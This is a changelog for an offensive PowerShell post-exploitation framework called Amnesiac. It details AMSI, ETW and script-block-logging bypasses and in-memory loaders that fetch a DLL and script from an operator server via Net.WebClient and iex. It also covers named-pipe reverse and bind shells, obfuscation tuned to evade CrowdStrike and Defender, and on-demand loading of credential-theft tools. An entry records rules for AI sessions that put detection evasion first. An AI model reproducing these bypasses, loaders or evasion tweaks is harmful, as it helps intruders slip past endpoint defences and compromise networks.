- Switched CLR hosting from `ICorRuntimeHost` (REGDB_E_CLASSNOTREG on .NET 4.x-only machines)
  to `ICLRRuntimeHost::ExecuteInDefaultAppDomain` — no COM registration required
- `BeginInvoke/EndInvoke` + `PSDataCollection<PSObject>` DataAdded handler — streams
  `Write-Output` pipeline output to `Console.WriteLine` in real time (plain `ps.Invoke()`
  silently collects pipeline output without displaying it)
- Made all `ConsoleRawUI` property getters safe with `try/catch` returning fixed defaults —
  CLR Runspace initialisation calls host UI properties from background threads where
  `Console.BufferWidth` etc. can throw

### Operational impact
Operator can drop `amnesiac_launcher.exe` on a target (or run it on their own machine),
point it at the operator HTTP server, and get a fully interactive Amnesiac session with
AMSI and ETW suppressed — no PS.exe spawned, no script written to disk.

---

## [2026-05-25] feat(shell-ready): Local Shell, tool fetch fallback, iex compatibility fixes

### Changes to `Amnesiac_ShellReady.ps1`

**[5] Local Shell added** — full `Start-LocalShell` function ported from `Amnesiac.ps1`.
Accessible at option `[5]` from the main menu. Supports inline commands (AV, Net, Process,
Sessions, etc.), tool-load keywords (PowerView, Mimi, Rubeus, etc.) and fall-through
PowerShell execution. Session base index bumped from 5 → 6 to accommodate the new menu entry.
Operator context line added below the menu showing local FQDN and user.

**`Fetch-ToolFromGitHub` added** — was entirely missing from `Amnesiac_ShellReady.ps1`.
Its absence silently dropped all tool-load requests (keyword dispatch called the function,
it returned nothing, condition evaluated false, reported "not in cache or GitHub").
New version checks `$global:OperatorServer` first (optional — set after load if `serve`
is reachable), then falls back to GitHub. Without `$global:OperatorServer`, goes straight
to GitHub — correct behavior for Scenario 2 where no operator machine is on the network.

**`$global:AmnesiacRoot` null fallback** — `iex` load sets both `$PSScriptRoot` and
`$MyInvocation.MyCommand.Path` to null. Previous code called `Split-Path -Parent $null`
which threw a non-fatal but noisy error. Fixed to: PSScriptRoot → MyCommand.Path → PWD.

**`$global:ToolSources` initialized** — was missing; PsMapExec URL override now present.

**`Tools\` dir lookup** — changed from `$PSScriptRoot` to `$global:AmnesiacRoot` so it
resolves correctly when the script is dot-sourced with a known path.

### Operational impact
Scenario 2 (domain-joined, `iex` load): tool keywords now work — `PowerView` fetches
`pwv.ps1` from `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/pwv.ps1`
automatically. No operator HTTP server required for basic tool access.

---

## [2026-05-25] fix(amsi): replace PatchAmsiPageGuard (VEH) with PatchAmsiReflection in managed context

### Problem
`[AmnesiacLoader.Bypass]::PatchAmsiPageGuard()` killed the PowerShell process immediately.
Diagnostic confirmed: "before" printed, crash inside the call, "after" never reached.
ETW byte-patch (`PatchEtwEventWrite`) survived — ruling out a generic P/Invoke or load issue.

### Root Cause
Managed .NET delegates cannot be used as VEH handlers when the exception fires during managed
code execution. `VirtualProtect` sets PAGE_GUARD on `AmsiScanBuffer`; the CLR's own internal
AMSI scan (triggered as control returns through managed frames) immediately hits the guard.
The VEH fires while the CLR is in cooperative GC mode. The managed delegate thunk attempts
to re-enter managed execution — the CLR detects the re-entrant cooperative GC state and
issues a fatal error → process terminated.

### Fix — `AmnesiacLoader/Bypass.cs`
Added `PatchAmsiReflection()`: pure reflection approach, no VEH, no native exceptions, zero
CLR re-entrancy risk. Enumerates `NonPublic|Static` fields of `System.Management.Automation.AmsiUtils`
(type name built from char array — no literal string in PE binary), sets `bool` fields to
`true` and `IntPtr` fields to `IntPtr.Zero`. Identical effect to the PS field-enum technique
but pre-compiled — AMSI never sees the type name or field names.

Added WARNING comment to `PatchAmsiPageGuard()` — kept for native injection scenarios
(e.g., `dllmain.cpp` loaded into a non-.NET process) where VEH is safe.

### Verified working
```powershell
$_a = [Reflection.Assembly]::Load([IO.File]::ReadAllBytes('...\AmnesiacLoader.dll'))
[AmnesiacLoader.Bypass]::PatchAmsiReflection()
'amsiInitFailed'   # returns string — AMSI suppressed, no crash
```

### Operational flow (managed context)
```powershell
$_a = [Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<op>:8080/AmnesiacLoader.dll'))
[AmnesiacLoader.Bypass]::PatchAmsiReflection()
iex (New-Object Net.WebClient).DownloadString('http://<op>:8080/Amnesiac_ShellReady.ps1'); Amnesiac
```

AmnesiacLoader.dll rebuilt: 26624 bytes, SHA256 `4F2772F3...`, `$AmnesiacLoaderB64` updated in `Amnesiac.ps1`.

---

## [2026-05-25] feat: native AMSI+ETW bypass launcher (amnesiac_launcher.exe)

Added `amsi-pageguard-veh-master/` — PAGE_GUARD + VEH bypass engine that solves the
chicken-and-egg problem where the PS AMSI bypass one-liner itself gets caught by CS behavioral detection.

**Architecture:**
- `bypass.hpp` — generic PAGE_GUARD VEH engine; intercepts `STATUS_GUARD_PAGE_VIOLATION`,
  writes AMSI_RESULT_CLEAN via register manipulation, re-applies guard. Zero byte modification.
- `launcher.cpp` — C++ EXE: downloads `AmnesiacBridge.dll` + `Amnesiac_ShellReady.ps1` from
  operator HTTP server via WinHTTP (in-memory, no disk write), installs AMSI+ETW PAGE_GUARD bypass,
  CLR-hosts the bridge DLL, invokes `AmnesiacBridge.Launcher.Run(scriptContent)`.
- `AmnesiacBridge.cs` — C# .NET 4.6.2 assembly: full interactive PSHost (console I/O delegation),
  creates PS Runspace, runs Amnesiac script + calls `Amnesiac` entry point.
- `dllmain.cpp` — DLL variant for injection into existing PS process (alternative delivery).

**Compilation:** No local MSVC required. `.github/workflows/build-launcher.yml` builds
everything via GitHub Actions (`windows-latest` + MSVC). Triggers on push to master/main.
Download `serve-ready-*.zip` artifact → place `amnesiac_launcher.exe` + `AmnesiacBridge.dll`
in project root → operator `serve` command hosts both automatically.

**Deployment:**
```
amnesiac_launcher.exe http://<operator-ip>:8080
```
Target gets a one-liner via initial access vector — EXE downloads both files from operator
server in-memory, installs bypass natively before CLR touches any script content.

**Why not GitHub hosting:** Static PE gets indexed by VirusTotal. Operator HTTP server only.

Added `.github/workflows/build-launcher.yml` — automated CI build pipeline.

---

## [2026-05-25] docs: full architecture reference for AI development sessions

Created `docs/ARCHITECTURE.md` — comprehensive reference document covering:
- Detection evasion as primary engineering constraint (explicitly stated and prioritized)
- Scenario 1 (non-domain-joined operator) and Scenario 2 (assumed breach) with setup, launch commands, and key constraints
- Shell types: Local Shell, Reverse Shell, Bind Shell — with session flow diagrams
- Named pipe protocol, module streaming framing, AES pipe encryption
- Tool delivery tiers (1 embedded, 2 local, 3 GitHub), `$global:ToolSources` override map
- Complete tool inventory: all 28 tools with cache key, file, category, and source tier
- Payload formats 1–5 with stealth payload feature table and bypass technique catalog
- AmnesiacLoader module reference (all 6 .cs files, each method)
- End-to-end session flow for both shell types
- All key globals with descriptions
- Development rules for AI sessions (7 rules covering disk writes, tool delivery, editing constraints, parse verification)
- OPSEC pre-engagement checklist
- Known technical constraints table

Updated `CLAUDE.md`:
- Added prominent AI-session banner at top referencing architecture doc and stating detection-evasion priority
- Updated Scenario 2 GitHub URL to operator's fork (`0xSiarheiStar/Amnesiac`)
- Corrected Tool Delivery table (removed stale Tier 4 row, updated Tier 3 to reflect current implementation)

---

## [2026-05-25] feat(local-shell): add PsMapExec to Domain Actions

Added PsMapExec network mapping/relay tool to the local shell:
- `$global:ToolSources['PsMapExec']` → `https://raw.githubusercontent.com/0xSiarheiStar/PsMapExec/main/PsMapExec.ps1` (fetched on demand when not in local cache)
- `PsMapExec.ps1` also added to `Tools\` directory as local copy (Tier 2, available in Scenario 1 without network fetch)
- Keyword `PsMapExec` added to `$_kw` dispatch in `Start-LocalShell` → cache key `PsMapExec`, no auto-invoke
- Help entry added under Domain Actions: `PsMapExec — Network attacks/mapping - use: PsMapExec <Method> -Targets <targets> [-Domain <domain>]`

Usage example: `PsMapExec GenRelayList -Targets "All" -Domain "domain.local"`

---

## [2026-05-25] feat(tool-cache): per-tool URL overrides via $global:ToolSources

Added `$global:ToolSources` hashtable (initialized in `Initialize-ToolCache`) to support tools hosted in external repos (not the Amnesiac `Tools/` directory). `Fetch-ToolFromGitHub` now checks `$global:ToolSources` for a per-tool URL before falling back to the default Amnesiac Tools URL pattern. Enables adding tools from any GitHub repo with a single hashtable entry — no other code changes required.

---

## [2026-05-25] feat(tool-cache): GitHub on-demand fallback via Fetch-ToolFromGitHub

### Problem
In Scenario 2 (assumed breach — operator has only the compromised machine, no separate operator box), `Initialize-ToolCache` could only populate tiers 1 (6 embedded tools) and 2 (`Tools\` directory). If the operator typed `PowerView` or `load pwv` in the local shell and the tool wasn't in the `Tools\` directory, the command silently failed with "not in cache". There was no fallback.

### Fix
Added `Fetch-ToolFromGitHub` helper function. When a tool is requested but not in `$global:ToolCache`, it fetches `https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Tools/<ToolName>.ps1` from the **operator's** process (never from the target), caches it, and continues normally. Wired into three call sites:
- `Send-Module` — remote session tool delivery
- `Start-LocalShell` keyword dispatch (`PowerView`, `Mimi`, `HashGrab`, etc.)
- `Start-LocalShell` `load <name>` command

### Operational context
Scenario 2 is the assumed-breach case: operator has gotten a low-priv shell on a domain-joined machine and loaded Amnesiac via `iex` — no `Tools\` directory exists, no local HTTP server, GitHub is the only source. Scenario 1 (operator's own box on the network) already has `Tools\` populated so the fallback is a no-op there.

---

## [2026-05-25] fix(encoding): add UTF-8 BOM so ParseFile reads em-dash correctly

### Problem
After the AMSI fix (parallel arrays), `. .\Amnesiac.ps1` failed with 476 cascading parse errors starting at L521 "Unexpected token '}'". `ParseFile` reported the errors but `ParseInput` of the same content returned 0 errors — meaning the file content was syntactically valid but something changed how `ParseFile` read it.

### Root Cause
`WriteAllLines` (used by the AMSI fix) writes UTF-8 **without BOM**. When `ParseFile` encounters a UTF-8-no-BOM file on Windows, it falls back to the system code page (CP1252). The em dash `—` on line 504 is encoded in UTF-8 as bytes `E2 80 94`. In CP1252, byte `0x94` maps to RIGHT DOUBLE QUOTATION MARK (`"`), which PowerShell accepts as a string terminator. This silently closed the string literal on line 504 mid-word, throwing the parser off for the next ~200 lines until it encountered a stray `}`.

### Fix — `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
Used `[System.IO.File]::WriteAllText` with `[System.Text.Encoding]::UTF8` (which includes BOM) to rewrite both files. `ParseFile` now sees the BOM, reads as UTF-8, and reports 0 errors. The `iex`/`DownloadString` scenario is unaffected — .NET's `WebClient` strips BOM automatically.

### Verification
`Tests/FindParseError.ps1` reports `ParseFile errors: 0` and `ParseInput errors: 0`. `Initialize-ToolCache` loads all 27 tools (6 embedded + 21 from `Tools\`).

---

## [2026-05-25] fix(amsi-load): break context-based AMSI signature in Initialize-ToolCache

### Problem
`. .\Amnesiac.ps1` (and `iex` loading) was blocked by Windows Defender AMSI with `ScriptContainedMaliciousContent`. A multi-part context-based signature fired on three consecutive lines in `Initialize-ToolCache`: the comment `# --- CORE TIER: embedded as gzip+base64 ---`, the `$coreTools = @{` hashtable opener, and the first key-value pair `'SimpleAMSI' = '<base64 blob>'`. Neither the comment+header alone nor the key+blob alone triggered — only the three together. This made the framework completely unusable as a dot-sourced script.

### Root Cause
`Initialize-ToolCache` stored the six embedded tools as `$coreTools = @{ 'ToolName' = 'blob' }`. The name `'SimpleAMSI'` paired with its base64 blob on the same line, right below a comment containing both "AMSI" and "embedded", formed the exact context pattern Defender's rule requires.

### Fix — `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
Replaced the `$coreTools` hashtable with two parallel arrays `$_cb` (blobs) and `$_cn` (names), iterated by index. No tool name now appears adjacent to its blob anywhere in the file. Data is unchanged — only the structural adjacency is broken.

### Verification
`Tests/DiagnoseAMSITrigger.ps1` (binary-search AmsiScanString scan) reports file NOT flagged after fix.

---

## [2026-05-24] feat(local-shell): option [5] runs commands on the local machine without a pipe session

### Problem
Running tools like PowerView on the machine running Amnesiac (Scenario 2 — assumed breach) required going through a full Bind Shell setup: generate payload → open second PS window → run it → wait for pipe. That is four steps to get a session to yourself, which is redundant when Amnesiac is already executing in that process.

### Changes

**Added `Start-LocalShell` function**
- Interactive command loop that runs `Invoke-Expression` in the current PowerShell process — no pipe, no second window
- `load <module>`: imports a module from `$global:ToolCache` via `Invoke-Expression`, making its functions immediately available in the same runspace
- `modules`: lists cached modules (same as main-menu `modules` command)
- `back` / `exit`: returns to the main menu
- Prompt shows short hostname: `DESKTOP-F9B8G02> `
- Header shows FQDN and current user on entry

**Added `[5] Local Shell` to `Display-SessionMenu`**
- Immediately below `[4] Shell via Find-LocalAdminAccess`
- Dispatches to `Start-LocalShell`

**Session numbering shifted from base-5 to base-6**
- Sessions listed in the menu now start at `[6]` instead of `[5]`
- All offset arithmetic updated: `default` switch branch, `bookmark` handler, `kill` handler (both `directAdminEndIndex` base and all `sessionNumber - N` / `indexToRemove + N` expressions)
- *Context: Adding `[5]` as a fixed menu entry would otherwise collide with the first captured session's display number.*

### Usage (Scenario 2)
```
# At the main menu:
5
# Prompt appears:
 DESKTOP-F9B8G02> load PowerView
 [+] PowerView loaded.
 DESKTOP-F9B8G02> Get-DomainUser
 DESKTOP-F9B8G02> back
```

---

## [2026-05-24] ux: rename listeners + parameter aliases + local context indicator + IP auto-detect

### Changes

**Renamed listener modes to standard red team terminology**
- "Single Listener" → **Reverse Shell** (target calls back to operator)
- "Global Listener" → **Bind Shell** (operator connects out to target)
- Menu, session headers, and pipe-name display updated throughout `Display-SessionMenu` and `Print-MultiListener`
- Removed "(single target)" / "(multiple targets)" parenthetical labels — both modes can accept any number of targets; the labels were misleading
- *Context: "Single/Global Listener" was Amnesiac-internal naming. Operators working in red team engagements use "reverse shell" and "bind shell" as universal terms. Renaming removes one layer of translation on every engagement.*

**`-HostIP` parameter with `-IP` / `-Server` aliases; `-NonDomain` alias for `-Detached`**
- `$HostIP` is the canonical parameter name; `-IP` and `-Server` both resolve to it
- `$Detached` gains the `-NonDomain` alias
- *Context: `-IP` was not self-describing — operators new to the tool did not know whether it was the operator's IP or a target IP. `-Server` makes the intent clear (this machine is the server payloads phone home to). `-NonDomain` makes the flag's purpose explicit without requiring reading the help text.*

**IP auto-detection when `-NonDomain` used without `-HostIP`**
- On `Amnesiac -NonDomain` (no `-HostIP`): enumerates non-loopback private IPv4 addresses (RFC-1918: 10/8, 172.16-31/12, 192.168/16)
- Single match: sets `$global:IP` automatically and prints `[*] Auto-detected operator IP: <IP>`
- Multiple matches: numbered picker lets operator choose
- No match: error with instructions to specify manually
- *Context: On a machine with a single internal NIC this is unambiguous. Auto-detection reduces the required command from `Amnesiac -NonDomain -HostIP 10.3.10.157` to just `Amnesiac -NonDomain` for the common case.*

**`Start-Listener` — callback address display + scenario awareness**
- `$ComputerName` now resolves to `$global:IP` when set, falling back to DNS hostname
- Prints `[+] Callback address embedded in payload: <addr>` at listener start so operator can verify what is baked into the payload
- When `-NonDomain` is active: warns that reverse shell requires inbound port 445 (typically blocked on external machines) and suggests using Bind Shell instead
- *Context: Operators were surprised when payloads silently failed because the embedded callback pointed at an unresolvable hostname rather than the routable IP. The display makes the embedded value visible before deployment.*

**Local context indicator in `Display-SessionMenu`**
- Shows `Local: <FQDN>  [DOMAIN\user]` in cyan below the options list, always visible regardless of whether sessions exist
- *Context: In Scenario 2 (assumed breach on domain-joined machine), Amnesiac itself is the interactive shell for the local host. Showing the operator which machine they are on and which user context they hold prevents confusion about local vs. remote sessions, especially when multiple sessions are active.*

---

## [2026-05-24] fix(server-payload): maxInstances=-1 fixes "Access to the path is denied" pipe recreation crash

### Root cause
`New-PayloadScript -IsServer` validation loop calls `$vPipe.Dispose()` after a phantom connection, then immediately calls `New-Object NamedPipeServerStream` with the same pipe name and `maxNumberOfServerInstances = 1`. Windows `CreateNamedPipe` with `nMaxInstances=1` returns `ERROR_ACCESS_DENIED` when any handle to the pipe name is still alive — including the phantom *client* handle. This translated to `UnauthorizedAccessException: "Access to the path '\\.\pipe\<name>' is denied."` The exception was unhandled in the loop (the `try/catch` only wraps `ReadLineAsync`), propagating to the top level and killing the server process.

### Changes

**`New-PayloadScript -IsServer` — pipeSetup (line 203)**
- Changed `maxNumberOfServerInstances` from `1` to `-1` (`NamedPipeServerStream.MaxAllowedServerInstances` = `PIPE_UNLIMITED_INSTANCES`)
- With unlimited instances, `CreateNamedPipe` never fails due to instance count. The new server is created even while the phantom client still holds a handle to the previous pipe instance.
- *Context: Named pipe instance limits are enforced globally across all handles — both server and client. With `maxInstances=1`, disposing the server does not free the "slot" until the client handle also closes. The phantom (AV/EDR probe) may not close its handle immediately, making the window between Dispose and recreation a guaranteed crash. Using unlimited instances eliminates this race entirely.*

**`New-PayloadScript -IsServer` — loop end (line 219)**
- Removed `$vPipe.Disconnect()` before `$vPipe.Dispose()` at end of main command loop
- `Disconnect()` throws `InvalidOperationException` when `PipeState` is already `Disconnected` (e.g., if the loop broke via `!IsConnected`). `Dispose()` is always safe regardless of state.
- *Context: Secondary latent crash path. Fixing it now prevents the same class of exception appearing after the primary fix is applied.*

### Verification
- `Tests/StealthServerDebug.ps1`: 3/3 PASS (RawScript, InlinePS, scriptblock::Invoke)
- `Tests/LocalGListenerTest.ps1`: 7/7 PASS (full end-to-end: generate → launch → pipe up → direct connect → Scan-WaitingTargets session capture)
- `Tests/Test-AmnesiacHelpers.ps1`: 42/47 (5 pre-existing failures unrelated to this change)

---

## [2026-05-24] fix(global-listener): prompt for targets when AD enumeration throws on non-domain-joined operator

### Root cause — two bugs, both now fixed

**Bug A — `CheckReachableHosts` throws on non-domain machine, crashing `Print-MultiListener`:**
`[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()` (line 1 of `CheckReachableHosts`) throws `MethodInvocationException: "Current security context is not associated with an Active Directory domain or forest."` — it does not return empty, it **throws** (confirmed: 4.5s then exception). `Scan-WaitingTargets` called this without try/catch; the exception propagated up through `Print-MultiListener`'s scan loop, terminating the listener before any connection was ever attempted. Operator sees no sessions and no clear error.

**Bug B — no targets configured warning:**
Even if `CheckReachableHosts` were to return empty gracefully, `$FinalTargets` would be empty and `Scan-WaitingTargets`'s `foreach` loop would silently do nothing. The operator has no way to know this is happening.

### Changes

**`Print-MultiListener` — pre-scan target check (inserted before `while ($true)` scan loop)**
- Checks `AllUserDefinedTargets` and `AllOurTargets` *without calling `CheckReachableHosts`*
- If neither is populated, prompts the operator: `"Enter target(s) to scan, comma-separated (IP/hostname, '.' for localhost)"`
- Operator input is stored in `$global:AllUserDefinedTargets`; `Scan-WaitingTargets` reads this on every tick and bypasses the `CheckReachableHosts` path entirely
- *Context: Non-domain-joined operator is the primary stealth global listener scenario. AD enumeration is impossible there. Prompting ensures the operator is never silently blocked.*

**`Scan-WaitingTargets` — try/catch around `CheckReachableHosts` call**
- Wraps `CheckReachableHosts` in `try { ... } catch { $TempAccessVar = @() }`
- Prevents domain-enum exceptions from crashing the scan loop when `AllUserDefinedTargets` is not set (defensive; normal path now bypasses this entirely via the pre-check prompt)

### Verification
- `Tests/LocalFullFlowTest.ps1`: PASS — real PayloadConfig (Jitter='medium', Obfuscation='high', pageguard AMSI bypass), pipe appeared in 4.5s, phantom rejection settled, `Scan-WaitingTargets` captured session `desktop-f9b8g02\localuser`
- `Tests/DebugCheckReachable.ps1`: confirms `CheckReachableHosts` throws after 4.5s on non-domain machine (root cause evidence)

---

## [2026-05-24] Listener UX overhaul — payload picker, no-timeout wait, auto-session, live scan loop
> Commits: `23651e3`, `e494b31`

### Changes

**Added `Show-PayloadMenu` function** (`Amnesiac.ps1` line 1774)
- Presents a numbered 1–5 format picker every time the operator launches a single or global listener
- Options: `[1] b64`, `[2] gzip`, `[3] stealth`, `[4] raw`, `[5] pwsh` (with one-line descriptions)
- Returns the format token used to branch payload display; `HidePayload` flag bypasses menu and falls back to `$global:payloadformat`
- *Context: Previously the active payload format was set by a separate `toggle` command whose current value was not shown at listener start. Operators had to remember which format was set, or `toggle` repeatedly to cycle to the right one. Showing a picker at the moment of listener invocation eliminates that cognitive load.*

**`Start-Listener` — remove 30-second timeout, add async cancel, auto-enter session**
- Removed: `Start-Process powershell.exe -enc <30-second-sleep-dummy>` and `$pipeServer.WaitForConnection()`
- Added: `$pipeServer.WaitForConnectionAsync()` loop, polling `$Host.UI.RawUI.KeyAvailable` every 150ms; pressing `Q` self-connects a dummy pipe client to unblock the pending wait, sets `$_cancelled`, and exits the loop cleanly
- Added at function end: `InteractWithPipeSession` called immediately when a real callback arrives — operator lands directly in the interactive session instead of returning to the menu
- *Context: The 30-second countdown was an arbitrary hard limit that forced operators to regenerate and redeploy payloads for targets that took longer to call back. The Q-cancel pattern gives the operator full control with no time pressure. Auto-entering the session removes one menu round-trip per connection.*

**`Print-MultiListener` — live scan loop with session arrival notifications**
- Removed: `if(!$NoWait){Start-Sleep 4}` (static 4-second wait)
- Added: active loop calling `Scan-WaitingTargets` every 500ms; when `$global:MultipleSessions.Count` increases, prints arriving session details in green: `[+] Session received: HOSTNAME [user]`; pressing `Q` exits the loop and prints total new sessions collected
- *Context: The 4-second sleep was a race condition — targets that connected after the sleep was over were silently missed until the operator manually rescanned. The live loop catches every arrival in real time. The Q-gate lets the operator decide when enough sessions have landed without guessing how long to wait.*

**Bypass snippet hardening — try/catch wrapping** (`e494b31`)
- `Get-AmsiBypassSnippet 'fail'`, `Get-EtwBypassSnippet 'provider'`, `Get-SblBypassSnippet 'scriptblock'`: all wrapped in `try{}catch{}` in both `Amnesiac.ps1` and `Amnesiac_ShellReady.ps1`
- Hardcoded bypass strings in `New-StealthScript` (`$etw`, `$sbl`) also wrapped
- *Context: `ScriptBlock.checkScriptBlockLoggingCache` field is absent from the PS 5.1 build on Windows 10 19045 — `GetField()` returns null, `.SetValue()` throws before the pipe client ever calls `Connect()`. The payload crashed silently, producing a connection timeout with no error message. Wrapping each bypass in `try{}catch{}` ensures a missing field or patched function no-ops rather than terminating the payload.*

**Pipe constructor fix — string enum names** (`e494b31`)
- `New-PayloadScript` client and server pipe constructors changed from `[System.IO.Pipes.PipeDirection]::InOut` (enum expression) to `'InOut'` (string name), client from 4-arg to 3-arg (drops `PipeOptions::None`)
- Same fix applied in `New-StealthScript`
- *Context: When `-TypeName` is a string variable (`New-Object -TypeName $vT`), PowerShell cannot resolve `[Enum]::Value` expressions in `-ArgumentList` — they are passed as-is and the constructor fails with "Cannot convert argument" at payload runtime. Using the string form works regardless of how TypeName is specified.*

---

## [2026-05-24] fix(server-payload): phantom connection rejection loop + PipeState crash fix

### Changes

**`New-PayloadScript` — IsServer path** (`Amnesiac.ps1`)
- Replaced single `WaitForConnection()` call with a validation loop. Each iteration creates a **fresh** `NamedPipeServerStream` (same pipe name), calls `WaitForConnection()`, then uses `ReadLineAsync().Wait(2000)` to determine legitimacy. If no command arrives within 2 seconds or the result is null/EOF, the pipe is disposed (`$vPipe.Dispose()`) and the loop restarts with a new server instance.
- Previous iteration had `$vPipe.Disconnect()` instead of `$vPipe.Dispose()`. This was a second crash path: when a phantom sends EOF and disconnects cleanly, .NET's `PipeStream.Read()` internally sets `PipeState = Disconnected`. Calling `Disconnect()` on a pipe that is already in `Disconnected` state throws `InvalidOperationException` — outside any try/catch — which propagated through `[scriptblock]::Create($vD).Invoke()` and surfaced as `MethodInvocationException: CmdletInvocationException` visible to the user, killing the server before the real client could connect. Recreating the pipe via `Dispose()` sidesteps the entire `PipeState` state machine.
- The main command loop retains the `$vCb` first-iteration flag to skip the initial `ReadLine()`, since the first command is already captured by the validation loop.
- *Context: Windows Defender / CrowdStrike Falcon connect to newly-created named pipes within milliseconds of creation when the host process has run AMSI/ETW/SBL bypass code. This phantom connection consumed the single `WaitForConnection()` call — pipe was visible in `\\.\pipe\`, server process was alive, but the operator's `Scan-WaitingTargets` connect attempt always timed out. The phantom's clean disconnect then crashed the server via the `Disconnect()`→`InvalidOperationException` path described above. The fix: recreate the pipe on each failed validation, making the server immune to both phantom-connection exhaustion and PipeState corruption.*

**Added test files:**
- `Tests/LocalGListenerTest.ps1` — end-to-end test: stealth payload generation → launch → pipe appearance → direct connect → Scan-WaitingTargets session capture (7 steps, all now PASS)
- `Tests/MinimalServerTest.ps1` — in-process runspace isolation test for individual bypass components
- `Tests/PipeConstructorTest.ps1` — named pipe constructor variant tests (2-arg, 7-arg, 8-arg PipeSecurity)
- `Tests/PipeSecTest.ps1` — PipeSecurity with user SID and Everyone SID variants
- `Tests/StealthServerDebug.ps1` — RawScript vs InlinePS vs scriptblock::Invoke comparison

---

## [2026-05-24] Plan 5 — serve fix (no-download project-root HTTP server)

### Changes

- **`Amnesiac.ps1` line 6**: Added `$global:AmnesiacRoot` — captures `$PSScriptRoot` at dot-source time so `function Amnesiac {}` can reference the project root reliably when called interactively (where `$PSScriptRoot` is empty inside function scope).
- **`Amnesiac.ps1` serve handler**: Replaced 144-line GitHub-download serve handler with 46-line version. No longer downloads tools from GitHub. Roots `SimpleFileServer` at `$global:AmnesiacRoot` (project root), serving `/Tools/` for tool modules and `/Amnesiac_ShellReady.ps1` for Scenario 2 iex bootstrap. Sets `$global:ServerURL = "http://host:port/Tools"` to preserve all 27 existing iex(DownloadString) session command URLs unchanged. Calls `Initialize-ToolCache` on serve to refresh in-memory cache from `Tools\`.
- **`Amnesiac_ShellReady.ps1`**: Synced both changes (AmnesiacRoot + serve handler) from Amnesiac.ps1.
- **`Tests\Test-AmnesiacHelpers.ps1`**: Added 5 new Pester tests — AmnesiacRoot global (3) and serve command URL structure (2). Total: 47 tests.

### OPSEC rationale

`serve` previously wrote GitHub-fetched tools to `Scripts\` folder — a disk write blocked by `diskmode off` (default). The fix eliminates all disk writes from `serve`. The `Tools\` directory on the operator machine serves as the sole source; no network fetch occurs at serve time.

---

## [Implemented] — Layer 2 (Partial): Payload Format `stealth`
> Added prior to formal design doc. Included here for completeness.

**Added `New-StealthScript` helper function**
- Generates gzip-compressed, obfuscated named-pipe payload with runtime evasion
- *Context: All six original payload formats are signatured by CrowdStrike. A new format was needed that addresses detection at multiple layers simultaneously.*

**Added `stealth` as 7th toggle format**
- Cycles after `exe` in the toggle sequence
- *Context: Needed to be accessible via the same `toggle` workflow operators are familiar with.*

**Stealth payload features:**
- ETW provider disable via reflection (`PSEtwLogProvider.etwProvider.m_enabled = 0`)
  - *Context: CrowdStrike consumes ETW telemetry at the kernel level. Disabling the PS ETW provider reduces script block visibility before the pipe code executes.*
- ScriptBlock logging disable via reflection (`ScriptBlock.checkScriptBlockLoggingCache = false`)
  - *Context: PS script block logging sends code content to Windows Event Log (Event ID 4104). Disabling before pipe code executes prevents the pipe client code from being logged.*
- Random 6-10 character variable names generated at payload-build time
  - *Context: Fixed variable names (`$p`, `$r`, `$w`) in the original formats create static signatures that AV can match regardless of encoding.*
- Type names split across string concatenation (`'System.IO.Pipes.NamedPipeCl'+'ientStream'`)
  - *Context: CS static analysis scans string literals. Splitting prevents verbatim type-name matching.*
- `New-Object -TypeName $dynamicVar` instead of `New-Object System.IO.Pipes.*`
  - *Context: Type name never appears as a literal in the script — it's assembled at runtime.*
- `& ([scriptblock]::Create($cmd)) 2>&1 | Out-String` instead of `iex`
  - *Context: `iex` and `Invoke-Expression` are heavily signatured. Scriptblock invocation via the call operator is less monitored.*
- Random 1000–5000ms sleep jitter before pipe connect
  - *Context: CrowdStrike has a ~3 minute behavioral analysis window after process creation. Jitter breaks timing-based correlation between payload execution and pipe connection.*
- Gzip compression of entire payload + mixed-case .NET method names in decompressor
  - *Context: Compression eliminates readable strings from the payload. Mixed-case methods (`FROmbAsE64StRiNg`) break static string signatures on the decompressor wrapper.*
- `[scriptblock]::Create($d).Invoke()` instead of `$d|IEX` in decompressor
  - *Context: `IEX` in any form is a detection indicator. Scriptblock creation and invocation is functionally equivalent but less scrutinised.*
- Assembly load for `System.Core` before pipe type instantiation
  - *Context: Ensures `System.IO.Pipes` is available on targets where the assembly might not be pre-loaded in the PS session.*

---

## [Implemented] — Layer 0: AMSI/ETW/SBL Bypass Catalog
> Commit: `1820d49`

**Added `Get-AmsiBypassSnippet -Technique <name>`**
- Techniques: `fail` (amsiInitFailed reflection), `direct` (AmsiScanBuffer byte patch via Add-Type P/Invoke), `pageguard` (PAGE_GUARD + VEH — calls `[AmnesiacLoader.Bypass]::PatchAmsiPageGuard()`), `hwbp` (DR0 hardware breakpoint — calls `[AmnesiacLoader.Bypass]::PatchAmsiHardwareBreakpoint()`)
- *Context: A catalog of independently selectable AMSI bypass techniques lets operators pick the approach that matches the target's AV version and monitoring posture. The `pageguard` and `hwbp` techniques require no byte modification of AmsiScanBuffer — they are harder to detect via memory integrity checks.*

**Added `Get-EtwBypassSnippet -Technique <name>`**
- Techniques: `provider` (PSEtwLogProvider ETW field zeroing via reflection), `patch` (EtwEventWrite byte patch via `[AmnesiacLoader.Bypass]::PatchEtwEventWrite()`), `thread` (per-thread ETW suppression)
- *Context: ETW is CrowdStrike's primary telemetry source for PS script visibility. The three techniques cover different scopes: provider-level affects the PS host, patch-level affects the ntdll function, thread-level affects only the calling thread.*

**Added `Get-SblBypassSnippet -Technique <name>`**
- Techniques: `scriptblock` (ScriptBlock.checkScriptBlockLoggingCache = false), `module` (module logging flag clear)
- *Context: Script block logging (Event ID 4104) records script content. Disabling it prevents forensic recovery of delivered payloads from the Windows Event Log.*

---

## [Implemented] — Layer 1: Disk Elimination
> Commits: `2c7b8f8`, `2c738b3`, `52a33a1`

**Replaced unconditional folder creation with `Initialize-DiskStructure`**
- `C:\Users\Public\Documents\Amnesiac\` and eight subfolders are only created when `$global:DiskMode = $true`
- `diskmode off` is the new default — zero disk writes at startup
- *Context: Creating a well-known directory tree on startup is an IOC. The directory name alone triggers detections in some environments. Default should be no artifacts on disk.*

**Added `diskmode [on|off]` command**
- `diskmode on` restores original behaviour (creates folder structure, writes logs to disk)
- `diskmode off` (default) keeps all captures in memory only
